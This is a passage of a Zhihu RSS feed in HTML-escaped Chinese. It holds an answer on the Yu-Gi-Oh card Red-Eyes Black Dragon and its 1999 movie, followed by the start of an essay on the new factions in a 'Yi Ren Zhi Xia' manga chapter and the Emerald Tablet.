data-private-watermark-src=\"v2-982a92469743b3c4a250c435d03c7efb\"></p>\n<p>在卡片交易市场行情中价值数十万的顶级稀有度，以及顶级的攻击力数值。这就是真红眼黑龙被称为顶级卡片的理由。</p>\n<p>首先说它数值顶级这点，你能在早期（决斗王国篇）数出很多攻击力超过真红眼的卡。但那种靠组合或战术堆起来的数值很显然还是不能算这张卡本身nb的。比如羽蛾的大飞蛾需要用很苛刻的条件让毛虫进化；神鹰女郎需要靠大量装备；鬼骨冢的活死人战术要用长时间来让僵尸慢慢强化。只算基础能力值的话，真红眼黑龙确实已经非常高了，在它之上的青眼白龙、黑魔术师、恶魔的召唤，都一样是被评价为万里挑一的稀有卡的。</p>\n<p><br></p>\n<p>大概也是因为比起各种铺垫的青眼白龙，它出现得太突兀了，当时的动画组在这上面做了些文章，围绕这张卡专门做了一个剧场版动画。这就是东映出品、延续自朝日版游戏王的，游戏王历史真正意义的第一个剧场动画，1999年剧场版《游戏王》，民间俗称《游戏王-真红眼黑龙》。下面跟大家讲解下这部30分钟的剧场动画剧情。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4ba72e49cf1604015a850ed10fbf1ccc_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4ba72e49cf1604015a850ed10fbf1ccc\" data-watermark-src=\"v2-76ebddacc6660d93d00c17c6693b32bc\" data-private-watermark-src=\"v2-dc4afc5dc54109d6e3de088d9b817937\"></p>\n<p>故事讲述的是武藤游戏邻居家，一个胆小懦弱、常被同龄人欺负的小孩，青山翔吾。他在偶然间去卡店抽包，开出了真红眼黑龙。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c3f4a3a47a435edf185bc6db1a208e0_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4c3f4a3a47a435edf185bc6db1a208e0\" data-watermark-src=\"v2-7e95c21c2ad1b87c950d6c5929fdd79b\" data-private-watermark-src=\"v2-1b1e840921f30bb326168e8fcedf9b77\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2b322c8386b0d2eff778f4942d6441d6_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2b322c8386b0d2eff778f4942d6441d6\" data-watermark-src=\"v2-0ced17d36be6d827f7e7a455ad1fec7b\" data-private-watermark-src=\"v2-b4989c7581ed4411ffcdf274ac9cec72\"></p>\n<p>卡店老板说明，这是和青眼白龙齐名的顶级稀有卡。显然出于大家可以理解的历史的局限性，她无法预知20多年后青眼白龙的身价上升到了8700万人民币。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-35ddc28e9c24d2d52508890794576a0b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35ddc28e9c24d2d52508890794576a0b\" data-watermark-src=\"v2-36d122f19e98b7863bfa11de921e8a7f\" data-private-watermark-src=\"v2-af10254c06f07702884d31adf7d82c7a\"></p>\n<p>得到了真红眼黑龙的翔吾自然把欺负他的大孩子吓了一跳。但他从未用真红眼黑龙决斗过。只是出示这张卡证明自己已经不会输给任何人了。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c1f13d661b84c5c27776a716a9fbaf80_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1f13d661b84c5c27776a716a9fbaf80\" data-watermark-src=\"v2-68c8cda4d377f033a5c8d243935a46a4\" data-private-watermark-src=\"v2-76acaa397785974c8aa53056cf49795d\"></p>\n<p>长期监视着童实野各大卡店的海马知道了这件事。他举办了一场赌上稀有卡的邀请赛，一方面想弄到翔吾手上的真红眼，另一方面也是为了击败游戏。</p>\n<p>中途，游戏和城之内在去参加过程中撞见海马的保镖，他抢走翔吾的真红眼并和游戏、城之内产生肢体摩擦。最后城之内帮翔吾夺回了真红眼，并将其加入到游戏卡组中去对战海马。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d85dd3a03015e9265ada754b38ed851d_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d85dd3a03015e9265ada754b38ed851d\" data-watermark-src=\"v2-04de5df3093bf8e6ff4469f9e86b52b1\" data-private-watermark-src=\"v2-13a39ecd27d896cd792b165d8ee82cf6\"></p>\n<p>王样和海马的对战使用的是王国篇里海马展示过的圆形决斗盘。决斗过程主要复刻自王国篇王样对阵傀儡师的流程，用黑魔术师+魔术礼帽+六芒星的咒缚的组合击破一只青眼白龙。</p>\n<p><br></p>\n<p>之后海马死者苏生出青眼白龙，并发动邪恶锁链，将三只青眼白龙结合到一起。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-40ccda1eb2fc9cbf42312cd0ad76c0f4_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-40ccda1eb2fc9cbf42312cd0ad76c0f4\" data-watermark-src=\"v2-857f98cfd7af410f95aedefb4f5f818b\" data-private-watermark-src=\"v2-6e7183e44da4ea3a262ea0cdc45cfabf\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-accea74dc4a582328b7bc200441c3e09_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-accea74dc4a582328b7bc200441c3e09\" data-watermark-src=\"v2-22982e0c9aa3112eaf83d64418eace05\" data-private-watermark-src=\"v2-d789760ce392bdd811d83b8e72aa4bdb\"></p>\n<p>这不是融合，所以这样结合出来的也并不是青眼究极龙。它的正式名字叫“青眼の白竜３体連結”。ZZ玩家可能对这张卡有印象，但要说它是纯粹的ZZ自创的假卡还真有点冤枉它了。这张卡是来自于游戏王的版权还属于万代的时期，由万代出品的卡片。ZZ卡的卡图也是原封不动照搬的这个。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-120044f5bde94ce65f122d5ebd5f863b_720w.jpg?rss\" data-rawwidth=\"368\" data-rawheight=\"366\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-120044f5bde94ce65f122d5ebd5f863b\" data-watermark-src=\"v2-48eefe6524ad3d1cd1571dcbaa84beed\" data-private-watermark-src=\"v2-4a5fa0cd1cfdf5e23d9569e1f900bab2\"></p>\n<p>说回正题。面对强大的三只青眼白龙，此时王样唯一的胜机就在真红眼身上了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4be5dea37562bae0f42a121ee212aa48_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4be5dea37562bae0f42a121ee212aa48\" data-watermark-src=\"v2-b0f3c1440fe26fd1f89922f6437b9160\" data-private-watermark-src=\"v2-4a70ab516e498a559ff4997bdf6da267\"></p>\n<p>翔吾见王样赢不了，习惯性的想逃避。城之内拉住他，让他坚持下去。真红眼是他的卡，王样使用真红眼需要他的斗志。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7cf29ac0bdbc0b54324d25d6215cdc59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7cf29ac0bdbc0b54324d25d6215cdc59\" data-watermark-src=\"v2-1b39801a3b3ea5e46a061b0f243ed800\" data-private-watermark-src=\"v2-9feb7cd3a596ccb938d53d414a37cf73\"></p>\n<p>翔吾拥有真红眼过后依然不敢和人决斗。他惧怕自己有了真红眼后依然打不过别人，那样会更加“站不起来”。城之内让他不要再抱着卡片做梦。既然是决斗者，就要敢于面对战斗，敢于面对自己。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c1b54038425e66aefc7abc56b31edd72_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1b54038425e66aefc7abc56b31edd72\" data-watermark-src=\"v2-49f42251f923c6168dcb58ecfab985c2\" data-private-watermark-src=\"v2-8e33b80dde93ac942f2589d3d0a954ee\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e21eba2bfa439eb94254d30bdfbb206c_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e21eba2bfa439eb94254d30bdfbb206c\" data-watermark-src=\"v2-a9766a26c9952e9f63ccccb31e0f39c0\" data-private-watermark-src=\"v2-edfcf1a96d6163a6518ba48a3dedf460\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-300c32bd0ebf2424d72757004c30d78b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-300c32bd0ebf2424d72757004c30d78b\" data-watermark-src=\"v2-a57ffe72cba93f1e92467fb13548b591\" data-private-watermark-src=\"v2-356bd45eb67ec616cd0d7e7c514e1dda\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9a5198ca905345febe360d7f8abaf431_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9a5198ca905345febe360d7f8abaf431\" data-watermark-src=\"v2-6218f9d0dc4a74ae5a5f4d24fcd3f777\" data-private-watermark-src=\"v2-b77920fd51f3705ba782613908c5539c\"></p>\n<p>这里开始切入主题了。真正的决斗者不是靠稀有卡，而是靠自身的斗志，和相信胜利的可能性。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f48477eb153f2137d5a6ca88ddde7299_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-f48477eb153f2137d5a6ca88ddde7299\" data-watermark-src=\"v2-1924854fa64cd296123530d8925e2dbf\" data-private-watermark-src=\"v2-2dda31921ba894894426baa75313fed8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-01b60dea8154a8ae06e08572e36ba52e_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-01b60dea8154a8ae06e08572e36ba52e\" data-watermark-src=\"v2-b4c937bc9be531ff0cac1a737678e7fc\" data-private-watermark-src=\"v2-11649c36d8f534676845ea98862b7108\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3dca4ecafcff91cecf94f07e412e75f5_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3dca4ecafcff91cecf94f07e412e75f5\" data-watermark-src=\"v2-807892f8679fedb0eee7f733bc000478\" data-private-watermark-src=\"v2-6a490e4a309b5ce61801ef11bef132f3\"></p>\n<p>这段台词是整部《真红眼黑龙》的核心。“可能性”既是黑龙带来的，也是决斗者带来的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b199dba4d6b81b6b7c2a2cfd918f6d10_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b199dba4d6b81b6b7c2a2cfd918f6d10\" data-watermark-src=\"v2-aafc58514796dc2f65841d4667f0dad6\" data-private-watermark-src=\"v2-49f7db76007d200e0cb58fdc6426f4cb\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-12f0f67e06b7f4d0b961cfd9ffff3e99_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-12f0f67e06b7f4d0b961cfd9ffff3e99\" data-watermark-src=\"v2-76b4103dc057562909ebda916f22d3c6\" data-private-watermark-src=\"v2-3f264c847c31584ebedd1eef63e8b049\"></p>\n<p>顿悟的翔吾鼓起勇气并传达给王样。王样终于召唤出真红眼黑龙。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c7a5c7b45ce9cd8ca46e78bdffcbab51_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c7a5c7b45ce9cd8ca46e78bdffcbab51\" data-watermark-src=\"v2-6fb212ffaa8a00d8033e28306c3dbfdc\" data-private-watermark-src=\"v2-061acdd03e59ab0fa514f14d58401a45\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b75e5b2375bcc62beed90c69dc3b4998_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b75e5b2375bcc62beed90c69dc3b4998\" data-watermark-src=\"v2-1544740aea36eda0567606cf46800e4c\" data-private-watermark-src=\"v2-0848dd652d92c968435a2fb1445d4c1f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d444634dfbc07b76e4593d8560521d59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d444634dfbc07b76e4593d8560521d59\" data-watermark-src=\"v2-a3cd9ccc3a20ae738c5f98ff4da32a53\" data-private-watermark-src=\"v2-bc434c67a1bd6b931e26dd1c76b50638\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2599b082deb8ac5c855410a767f939e3_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2599b082deb8ac5c855410a767f939e3\" data-watermark-src=\"v2-ce75647a7cfef51e565f41b8a7d4fceb\" data-private-watermark-src=\"v2-46058fba60dd940bd3c3bb0fa53cb3dc\"></p>\n<p>出场时的气势还是很赞的。但是……</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-28b4a3f22eaa96d16e3dd2f0461b1f78_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-28b4a3f22eaa96d16e3dd2f0461b1f78\" data-watermark-src=\"v2-9663b0345331ed36d4e6ab0916639634\" data-private-watermark-src=\"v2-baa6ad6a253eb57061de3aac6d00549e\"></p>\n<p>马上就被拿来融合了。</p>\n<p><br></p>\n<p>真红眼和王样场上的流星龙融合，成了流星黑龙。没错，不仅流星黑龙其实是王样用出来的，流星龙也是。不动游星是谁？不太熟啊。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-21644bdec8494533f4d5ca74c849e9e1_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-21644bdec8494533f4d5ca74c849e9e1\" data-watermark-src=\"v2-1be39fc4c49833734b715f95a4d9c401\" data-private-watermark-src=\"v2-a03461db1e2d7ad27582fc2c57f79768\"></p>\n<p>流星黑龙击败青眼白龙3体连接，打败海马。从这场战斗中得到勇气的翔吾也能正常的打牌了。以前欺负他的大孩子也成为了朋友。故事结束。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a731ad00351e78791660f0fd831af552_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a731ad00351e78791660f0fd831af552\" data-watermark-src=\"v2-668313755bd6f67fffc47bf8d7a4d8ac\" data-private-watermark-src=\"v2-8d47c374e0ceaa9164b723b08b20da27\"></p>\n<p><br></p>\n<p><br></p>\n<p>这个剧场版除了赋予“白龙带来胜利，黑龙带来可能性”这个象征意义外，还通过这个故事把真红眼与决斗者的斗志绑在了一起。当然，这是因为原作剧情后来真红眼成了城之内的卡。对于城之内这么一个从区大赛8强起步，一步步打成决斗城市准决赛的底层励志角色来说，斗志、可能性，形容的既是真红眼，也是城之内本人。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-19e3732cb72fd604fd3360ffd54d24a4_720w.jpg?rss\" data-rawwidth=\"417\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-19e3732cb72fd604fd3360ffd54d24a4\" data-watermark-src=\"v2-5f4749a46372bb0705dfdce610b9e6de\" data-private-watermark-src=\"v2-0ee58a90d087c32beab8034cea7ce063\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-bab92ffcdfde35c55ab16b9fca0b453a_720w.jpg?rss\" data-rawwidth=\"1982\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bab92ffcdfde35c55ab16b9fca0b453a\" data-watermark-src=\"v2-d9431e0a6137d2f3de9c7c71a95f21d2\" data-private-watermark-src=\"v2-780680b647173086b1f2d480a43b518d\"></p>\n<p>在决斗城市开幕期间，城之内认为自己实力还配不上使用真红眼，将其交给了王样保管，由此这张卡也成为了代表2人羁绊的卡。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4727bd92b988637efd4eb30e7b7a4c2a_720w.jpg?rss\" data-rawwidth=\"2030\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4727bd92b988637efd4eb30e7b7a4c2a\" data-watermark-src=\"v2-9125de54350c74c73eee1fd89e77cf0c\" data-private-watermark-src=\"v2-4f754c590e77042ff779f51d39208a98\"></p>\n<p>城之内被马利克洗脑进行的码头决斗时，表君用手札对换来尝试唤醒城之内。城之内残存的意识还记得自己的承诺，一定要到自己能成为独当一面的决斗者时，才能取回真红眼。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4bcd781376eec0f31f1556429e134f78_720w.jpg?rss\" data-rawwidth=\"2034\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4bcd781376eec0f31f1556429e134f78\" data-watermark-src=\"v2-f113a8cd8a74bd65dfda830b4a87d453\" data-private-watermark-src=\"v2-6e835710a90c7b1ecfbba4a5df64f23a\"></p>\n<p>这段剧情让真红眼成了2人羁绊的见证。并在之后的决斗城市准决赛上，真红眼在场上提升超魔导剑士攻击力，帮助王样战胜海马。</p>\n<p>小tips：其实在游戏王原作里，真红眼在王样手上的戏份比在城之内那还多些。因为整个决斗城市篇它都在王样卡组里，而决斗城市篇之后城之内也没有再决斗过了。</p>\n<p><br></p>\n<p>综上所述，一开始，真红眼黑龙这张卡的意义只是在剧情设定上的超高地位，但后续无论原作剧情还是动画原创的剧场版剧情，都在为其增添它的象征意义。到如今留在我们记忆里的真红眼黑龙，它就如同景山东坡的老歪脖子树，所携带的那些故事就已经让它充满了历史价值，本身故事设定的稀有度什么的反而不重要了。如同《真红眼黑龙》中所描绘的，卡片再稀有、再强大，终究只是卡片。决斗者最强大的武器，是自己的心。</p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ai-xie-71-25?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">艾叶</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">42 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/431039255?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问有类似心灵崩坏的游戏王卡片推荐一下吗？</a><br><a href=\"http://www.zhihu.com/question/444088245?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏王对战中，卡片不会成为卡片效果对象和不会被魔法陷阱怪兽效果影响这两个描述本质上有什么不同吗？</a><br>\n","link":"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《一人之下》第533（566）话？","date":"2021-07-02 11:30:09","description":"\n<p>漫画533（566）话出现了许多新势力，从个人而言是开心的，这说明一人的格局并没有被完全被甲申之乱和三十六贼束缚；时至今日还在开辟新的世界；人外有人，天外有天；这才更像一个真实的世界；所以这里从个人角度来尝试着寻找一下这些世界势力的原型；</p>\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《一人之下》漫画和手游为基础做的简单整理；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i><br><i>2，文中涉及的历史，符文以及各门派的简介，都是仅在一人之下世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i> <br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-55d320a66f7bb4ee4ebcf362c60e66ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"339\" data-watermark=\"watermark\" data-original-src=\"v2-55d320a66f7bb4ee4ebcf362c60e66ae\" data-watermark-src=\"v2-d269b95f035e43ad2174831b9c493427\" data-private-watermark-src=\"v2-43a44f8c14b7d89ab162d7f7e5f088d1\"></p>\n<p><i>如果有时间也可以先看之前做的漫画 </i>531（565）话之前世界异人的总结；</p>\n<a href=\"https://zhuanlan.zhihu.com/p/381719463\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-b68b2071ca06cb01c14181e72308f3b9_720w.jpg\" data-entity-type=\"article\" data-entity-data=\"null\" class=\"internal\">【一人之下】——世界异人汇总(截止漫画531话）</a><h2>目录</h2>\n<p><b>引子</b></p>\n<p><b>翡翠学会</b></p>\n<p>1.翠玉录</p>\n<p>2.牛顿</p>\n<p>3.斯宾塞</p>\n<p><b>大地之子</b></p>\n<p>1.盖亚</p>\n<p>2.那罗伽</p>\n<p>3.地母神</p>\n<p><b>异人馆</b></p>\n<p>1.九属会馆</p>\n<p>2.查侬</p>\n<p><b>石川流</b></p>\n<p>1.石川家</p>\n<p>2.妖刀蛭丸</p>\n<p><b>贝希摩斯</b></p>\n<p>1.贝希摩斯</p>\n<p>2.工业法器</p>\n<p>3.美国工会</p>\n<p><b>纳森岛</b></p>\n<p>1.阿方索</p>\n<p>2.纳森王</p>\n<p>3.投石问路</p>\n<p><b>个人想法</b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2>引子</h2>\n<p>漫画533（566）话出现了许多新势力，我们知道在中国有哪都通管理全国异人，那世界的其他地方，是什么样的组织在管理各方异人呢？虽然现在我们只了解到他们的名字，但是其实其中的许多名字都可以在现实世界中的世界传说和各国组织中找到一定的相似之处；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-99d1b90fef8afc45e57917b59929553d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"182\" data-watermark=\"watermark\" data-original-src=\"v2-99d1b90fef8afc45e57917b59929553d\" data-watermark-src=\"v2-2d79ff4b65d21566f78d5d279f663661\" data-private-watermark-src=\"\"></p>\n<h2><b>翡翠学会</b></h2>\n<p><b>1.翠玉录</b></p>\n<p>不出意外的话，这个翡翠学会的来源应该就是源自传说中的《翠玉录》；（overlord中雅儿贝德三姐妹的制作者的ID也是借鉴了这一原型。）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-822c348e1572cea26cd15e67a6bc5b8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-822c348e1572cea26cd15e67a6bc5b8a\" data-watermark-src=\"v2-ef5958deabdd11be483090a355c70ed4\" data-private-watermark-src=\"\"></p>\n<p>那么为什么《翠玉录》在西方那么有名呢？传说西方炼金术起源自埃及。公元前1900年。埃及法老赫耳墨斯以及他传说中的父亲透特神以及赫尔墨斯的大儿子大祭祀塔特三代神明将所有炼金术的知识浓缩为13句话，雕刻在一块翠绿的祖母绿宝石板上，流传于人世。因此《翠玉录》也被称为翠玉十三章，这篇文字被认为是西方炼金术的源头和鼻祖；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7d70b9fe6f8ba8551e8972003a3120f9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"183\" data-watermark=\"watermark\" data-original-src=\"v2-7d70b9fe6f8ba8551e8972003a3120f9\" data-watermark-src=\"v2-522f2a0565a50e43b93f8cca1a50e891\" data-private-watermark-src=\"\"></p>\n<p>那么这《翠玉录》中究竟说了什么呢？这里列出一下这十三句话；「内容来源网络侵删」</p>\n<blockquote>作者：艾萨克·牛顿 名称：《翠玉录》 链接：<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E7%25BF%25A0%25E7%258E%2589%25E5%25BD%2595/4579712%3Ffr%3Daladdin\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">翠玉录（词语）_百度百科</a>\n</blockquote>\n<p>1. 真实不虚，永不说谎，必然带来真实： Tis true without lying, certain &amp; most true:</p>\n<p>2.下如同上，上如同下；依此成全太一的奇迹。 That which is below is like that which is above and that which is above is like that which is below to do ye miracles of one only thing.</p>\n<p><img src=\"https://pic4.zhimg.com/v2-58b8d6304a790d20bbf27e8168c4f82c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1368\" data-rawheight=\"291\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>3.万物本是太一，借由分化从太一创造出来。 And as all things have been and arose from one by ye mediation of one: so all things have their birth from this one thing by adaptation.</p>\n<p>4.太阳为父，月亮为母，从风孕育，从地养护。 The Sun is its father, the moon its mother, the wind hath carried it in its belly, the earth its nourse.</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f8b961b14317862800cf5c969ef445f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1376\" data-rawheight=\"307\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>5.世间一切完美之源就在此处；其能力在地上最为完全。 The father of all perfection in ye whole world is here. Its force or power is entire if it be converted into earth.</p>\n<p>6.分土于火，萃精于糙，谨慎行之。 Separate thou ye earth from ye fire, ye subtile from the gross sweetly wth great indoustry.</p>\n<p><img src=\"https://pic2.zhimg.com/v2-452e645e879f66f710d2de25786324fe_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1369\" data-rawheight=\"340\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>7.从地升天，又从天而降，获得其上、其下之能力。 It ascends from ye earth to ye heaven &amp; again it desends to ye earth and receives ye force of things superior &amp; inferior.</p>\n<p>8.如此可得世界的荣耀、远离黑暗蒙昧。 By this means you shall have ye glory of ye whole world &amp; thereby all obscurity shall fly from you.</p>\n<p>9.此为万力之力，摧坚拔韧。 Its force is above all force, for it vanquishes every subtile thing &amp; penetrates every solid thing.</p>\n<p><img src=\"https://pic3.zhimg.com/v2-deed0e5111f61fb75f7db2ad64c35be6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1382\" data-rawheight=\"414\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>10.世界即如此创造。 So was ye world created.</p>\n<p>11.依此可达奇迹。 From this are &amp; do come admirable adaptations whereof ye process is here in this.</p>\n<p>12.我被称为三重伟大的赫尔墨斯，因我拥有世界三部分的智慧。 Hence I am called Hermes Trismegist, having the three parts of ye philosophy of ye whole world.</p>\n<p>13.这就是我所说的伟大工作。 That which I have said of ye operation of ye Sun is accomplished &amp; ended.</p>\n<p>以上就是英文版与中文版的《翠玉录》了（原文是拉丁文的），炼金术士认为太阳指的是不朽的精神，月亮指的是低层次的自我，是高我的投影。风是指灵性的生命力，地是指物质的躯体。炼金就是指神性与躯体的联合、精神和物质的统一；（信息来源于网络）如果这个解读角度合理的话，那这一点从和中国修炼中的性命双修其实也是异曲同工的；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1b78b5442e9ce51713fb675f6d84b8bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"191\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>2.牛顿</b></p>\n<p>在研究和解读《翠玉录》的人中，最有名的要数著名科学家艾萨克·牛顿了；传说上文引用的英文翻译就是他所做的；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-be2e55e5fa3b416ae8ffa60b286cc9ab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" 